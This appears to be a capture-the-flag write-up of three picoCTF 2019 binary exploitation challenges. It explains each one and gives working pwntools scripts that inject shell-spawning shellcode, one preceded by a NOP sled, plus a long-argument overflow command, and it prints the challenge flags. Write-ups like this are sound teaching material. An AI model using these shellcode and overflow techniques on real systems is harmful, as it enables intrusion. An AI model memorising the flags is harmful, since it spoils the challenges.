
# [PICO CTF (2019)](https://github.com/Ordered-Chaos/Pwnfolio#main)<a name="picoctf19"></a>
[<p align="right">back to main</p>](https://github.com/Ordered-Chaos/Pwnfolio#main)
***

| Problem | Category | Points | Problem | Category | Points |
| ------- | -------- | ------ | ------- | -------- | ------ | 
| [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | [Overflow 0](#overflow0) | Binary Exploitation | 100 |
| [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 | Overflow 1 | Binary Exploitation | 150 |

***

## HANDY SHELLCODE <a name="handyshellcode"></a>

> ### Problem 
>> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. 
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/handshellcodesource.md#handyshellsource)
>
> ### Solution
>> The solution here is pretty straightforward. All you need to do is supply the program with shellcode
>> and it will execute it. A simple pwntools script using `shellcraft.sh()` as the payload can get this done.

~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6')

shellcode = asm(shellcraft.sh())

payload = shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()

~~~

**FLAG:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*

[Return to Top](#picoctf19)
***

## SLIPPERY SHELLCODE <a name="slipperyshellcode"></a>

> ### Problem 
>> This program is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? 
>> You can find the program in /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 on the shell server.
>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/slipperyshellcode.md#slipperyshellsource1)
>
> ### Solution
>> In this challenge we again need to supply the program with shellcode using `shellcraft.sh()`. The source code
>> reveals that this time, the program will begin execution of the shellcode from a random location within a 256 
>> byte range. To make sure that we execute our code, all that needs to be done is to supply an 'x\90' NOP sled
>> that's 256 bytes long directly preceding the shellcode. This can be done with the following pwntools script.

~~~python
#!/usr/bin/env python

from pwn import *

context.clear(os='linux', arch='i386')
context.log_level = 'info'

s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')

io = s.process('vuln',cwd='/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1')

padding = '\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print io.recv()
io.sendline(payload)

print io.recv()
io.sendline('cat flag.txt')

print io.recv()
~~~

**FLAG:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*

[Return to Top](#picoctf19)
***
## OVERFLOW 0<a name="overflow0"></a>

> ### Problem
>> This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in 
>> /problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow0source.md#overflow0source1)

> ##  Solution
>> After looking at the program, you can tell that it checks to see if `argv[]` is greater or less than the buffer. If it is, then it prints the flag file.
>> So all we have to do is call `./vuln` with more than 64 arguments.
~~~bash
kali@kali:~/ctf/pico/overflow0$ ssh User@2019shell1.picoctf.com 'cd /problems/
overflow-0_1_54d12127b2833f7eab9758b43e88d3b7; ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
~~~

**FLAG:** *picoCTF{3asY_P3a5yb197d4e2}*

[Return to Top](#picoctf19)
***
